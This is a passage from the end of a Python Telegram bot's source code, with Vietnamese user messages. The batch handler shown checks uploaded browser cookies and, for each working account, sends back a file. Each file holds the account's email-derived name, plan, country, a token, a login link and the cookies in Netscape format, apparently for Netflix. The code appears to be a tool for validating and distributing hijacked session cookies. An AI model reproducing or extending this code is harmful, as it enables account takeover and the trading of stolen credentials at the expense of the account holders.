            banner_batch_done(success_count, len(all_cookies)),
            parse_mode='Markdown'
        )

        # Send results
        if results:
            for i, result in enumerate(results, 1):
                acc = result['account']
                card = format_batch_card(acc, result['link'], i)
                await update.message.reply_text(card, parse_mode='Markdown', disable_web_page_preview=True)

                email = acc.get('email', 'NoEmail')
                email_clean = re.sub(r'[^\w\-_]', '', email.split('@')[0]) if email != 'N/A' and '@' in email else 'NoEmail'
                plan_clean = re.sub(r'[^\w\-_]', '', acc.get('plan', 'NoPlan').replace(' ', '_'))
                country_clean = re.sub(r'[^\w\-_]', '', acc.get('country', 'XX'))
                fname = f"NF_{email_clean}_{plan_clean}_{country_clean}.txt"

                fc = (
                    f"# {BOT_NAME} v{BOT_VERSION}\n"
                    f"# Token: {result['token']}\n"
                    f"# Login: {result['link']}\n"
                    f"#\n"
                    f"{checker.build_netscape_format(result['cookies'])}"
                )
                await update.message.reply_document(
                    document=io.BytesIO(fc.encode()),
                    filename=fname,
                    caption=f"📄 #{i} — {fname}"
                )
        else:
            await update.message.reply_text(
                f"❌ Không có cookie nào hoạt động.\n\n  {FOOTER}",
                parse_mode='Markdown'
            )

        await update.message.reply_text("⬇️", reply_markup=kb_done())

    except Exception as e:
        logger.error(f"Batch error: {e}")
        await status_msg.edit_text(
            f"❌ *Lỗi xử lý file*\n\n  `{str(e)[:80]}`\n\n  {FOOTER}",
            parse_mode='Markdown'
        )
        active_tasks.pop(chat_id, None)


async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Error: {context.error}")


# ══════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════
def main():
    if not TOKEN:
        raise RuntimeError('Thiếu biến môi trường TELEGRAM_BOT_TOKEN')
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    application.add_error_handler(error_handler)

    import sys
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    print(f"[{BOT_NAME}] Bot running on v{BOT_VERSION}...")
    application.run_polling()

if __name__ == '__main__':
    main()
